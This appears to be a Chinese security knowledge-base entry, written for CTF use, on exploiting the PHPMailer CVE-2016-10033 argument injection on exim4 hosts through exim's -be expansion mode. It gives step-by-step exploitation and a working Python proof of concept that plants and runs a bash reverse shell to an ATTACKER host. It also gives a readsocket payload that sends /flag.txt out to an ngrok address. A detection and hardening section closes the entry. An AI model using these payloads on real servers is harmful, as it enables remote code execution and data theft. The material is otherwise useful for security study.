---
id: web-php-rce-phpmailer-exim-be-expansion-command-exec
title: PHPMailer 参数注入打 exim4 MTA：-be 批处理模式 + ${run}/${readsocket} 字符串扩展实现 RCE
type: scenario
domain: web
path: web/php/rce
technique: phpmailer-exim-be-expansion-rce
tags:
- php
- phpmailer
- exim
- rce
- argument-injection
- mail
- ctf
cve: CVE-2016-10033
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: PHPMailer <= 5.2.17
verification:
  verified_by: verifier-T1-22
  verified_at: '2026-11-08T13:27:17+08:00'
  notes: 已对照原文核对：CVE-2016-10033、-be/${run}/${readsocket}/${readsocket} 外带变体、-Ov 与 RFC3696 引号闭合、三步反弹 shell PoC 与截图（class.phpmailer.php 2016-12-09→v5.2.17、www-data shell）均一致；affected_versions 区间取 CVE 公开修复线 5.2.18（原文只写 v5.2.17），括号注释已去；无 sources 字段（与库内惯例一致）；exim ${run} 未被 disable 为未验证点
url: /docs/web/php/rce/web-php-rce-phpmailer-exim-be-expansion-command-exec/
draft: false
kb_aliases:
- Uselesscorp
- CVE-2016-10033 变体
- exim -be 字符串扩展
- ${run preexpand base64d}
- readsocket readfile
- -Ov 参数吞并
---

## 一句话结论

PHP ≤5.2.17 的 PHPMailer 把用户可控 email 拼进 `sendmail` 命令参数（CVE-2016-10033），当主机 MTA 是 Debian 常用的 **exim4** 而非 sendmail 时，经典 `-X` 日志写 shell 手法失效，但可用 `-be`（批处理字符串展开模式）让 exim 把注入参数当代码求值：`"a\" -be ${run,preexpand{${base64d:<b64cmd>}}} -Ov="@d` 闭合引号后以 `${run}` 执行任意命令，或用 `${readsocket}`/`${readfile}` 直接回读文件/外带数据。

## 原理

- **注入根源**：`mail()` 通过 `/usr/sbin/sendmail` 发信，PHPMailer 的 `sender`/`from` 字段未过滤空格与引号，攻击者可在 `-t -i -f<sender>` 之后追加任意参数（CVE-2016-10033）。利用载荷以双引号包裹时按 RFC 3696 构造 `"a\" ... "@d` 形式：`\"` 闭合 PHPMailer 写的前一个引号、`"@d` 开启新引号吞掉尾部，使中间内容成为独立参数。
- **换 MTA 即换利用面**：Debian 系默认 MTA 是 exim4，`/usr/sbin/sendmail` 通常是 exim 的兼容符号链接。经典 CVE-2016-10033 exp 依赖 sendmail 的 `-X` 日志文件写 webshell，exim 不支持该参数——但 exim 支持 `-be`：以批处理模式把后续参数当作字符串展开表达式求值，这正是 exim 配置语言的能力面。
- **exim 字符串扩展即命令面**：`-be` 模式下可用扩展操作符：
  - `${run{<command> <args>}}`——执行外部命令，stdout 作为 `$value` 插入结果（配合 `preexpand` 先展开内层）；
  - `${base64d:<string>}`——base64 解码，规避空格/引号在邮件字段里的转义问题；
  - `${readfile{<file>}}`——读文件并压掉换行；
  - `${readsocket{inet:host:port}{request}}`——向本地/远程 socket 发请求并插入响应，可直接把读到的 `/flag.txt` POST 到外部服务器做无命令执行的数据外带。
- **`-Ov` 兜底**：`-Ov` 是 exim 的宏定义参数，用于吞掉/中和注入串之后 PHPMailer 附加的剩余参数（`-t -i -f...`），保证 `-be` 拿到的表达式干净求值。极短的 `@d` 域即可满足 RFC 3696 的地址形状，减少 payload 长度。
- **与原 exp 的本质区别**：原 CVE 走"写文件"（污染日志路径），exim 路线走"表达式求值"（`${run}` 直接执行），因此对过滤了 `X`/路径字符但放行 `${}`、`-be` 的环境依然可用，且无需知道 web 根路径。

## 触发条件

- 目标使用含 CVE-2016-10033 的 PHPMailer（≤5.2.17；5.2.18 修复）且未过滤 `email`/`sender` 中的空格、引号。
- 主机 MTA 为 exim4（Debian/Ubuntu 常见），`sendmail` 链接到 exim 且 `-be` 未被 wrappers 禁用；exim 版本支持 `${run}`（需确认未设 `disable_run` 类限制）。
- PHP `mail()` 可达（联系表单、找回密码等触发发信的功能点）。

## 利用步骤

1. 指纹识别：目录扫描发现 `class.phpmailer.php`，按文件头注释/日期确认版本 5.2.17。
2. 先试经典 sendmail `-X` exp，失败则确认 MTA 为 exim4（报错特征/`-be` 探测）。
3. 构造 email 字段注入：`"a\" -be <expr> -Ov="@d`，其中 `<expr>` 为 exim 扩展表达式。
4. 命令经 base64 编码塞入表达式，写入再执行反弹 shell：
   - 第一发：`-be ${run,preexpand{${base64d:<b64 of: /bin/sh -c "echo -n '<revshell>' >> /tmp/x"}}}}` 落地脚本；
   - 第二发：执行 `/bin/bash /tmp/x`；
   - 第三发：清理 `/tmp/x`。
5. 变体（无交互外带）：`email="\" -be ${readsocket{inet:<ngrok-host>:19066}{${readfile{/flag.txt}}}} "@x`，把 flag 直接 POST 到外部监听端。

## PoC

```python
import requests, base64
URL = "http://target/index.php"

def send_mail(mail):
    requests.post(URL, data={"name":"a","email":mail,"subject":"1",
                             "message":"Pwned!","submit":"submit"})

def run_exp(cmd):
    b64 = base64.b64encode(cmd.encode()).decode()
    expr = "${run,preexpand{${base64d:" + b64 + "}}}"
    # \" 闭合 PHPMailer 的引号，-be 进入 exim 求值，-Ov 吞掉尾参，"@d 收尾
    send_mail('"a\\" -be ' + expr + ' "@d')

run_exp('/bin/sh -c "echo -n \'/bin/bash -i >& /dev/tcp/ATTACKER/9999 0>&1\' >> /tmp/d"')
run_exp('/bin/bash /tmp/d')
run_exp('/bin/rm /tmp/d')
```

官方风格变体（readsocket 直接外带文件内容）：

```text
email="\" -be ${readsocket{inet:0.tcp.ap.ngrok.io:19066}{${readfile{/flag.txt}}}} "@x
```

## 变体与关联

- 变体：`-be` + `${run}` 之外还可用 `${readfile}` 组合 `${readsocket}` 做纯读取外带；本地 unix socket 场景可打 Redis 等内网服务。
- 变体：同源问题在其它把用户输入拼进 `mail()` 第五参数的代码（自研 `mail()` 封装、Pear Mail）中同样成立，换 MTA 后利用面随 MTA 参数集变化（postfix/sendmail 走 `-X`，exim 走 `-be`）。
- 变体：过滤了 `-X` 但未过滤 `-be`/`-O` 系列；或过滤空格时用 `${base64d}`/IFS 变体压缩 payload。
- 关联：CVE-2016-10033 原始 sendmail `-X` 利用；`-be` 与 exim 历史上的 CVE-2019-10149（`/${run}` 在 RCPT TO 中）同属"exim 扩展语言当命令面"的利用思想。
- 边界：exim 高版本可能禁用 `${run}`（编译选项/宏），`-be` 需要本地命令行调用权限；PHPMailer ≥5.2.18 对 sender 做了 `escapeshellarg` 类修复；若主机用 postfix，`-be` 无效需回归 `-X` 路线。

## 检测与防御

- **升级与过滤**：PHPMailer 升级到 ≥5.2.18/≥6.x；对参与 `mail()` 第五参数的地址严格校验（不允许空格、引号、`-` 开头的参数形状）。
- **MTA 加固**：exim 编译/配置禁用非必需的 `${run}`（确认无 `run` 使用面）、限制 `-be` 的调用来源；监控 sendmail 管道收到含 `${`、`-be`、`-O` 的异常参数。
- **检测**：邮件投递日志中对同一表单的高频、带 `${run`/`base64d`/`readsocket` 特征的地址；出口流量中出现表单提交后立刻发起的外连 socket。
- **响应**：临时以 postfix 替换或 wrapper 过滤 exim 参数；排查 `/tmp` 落地脚本、exim panic log 与反弹 shell 出网记录。
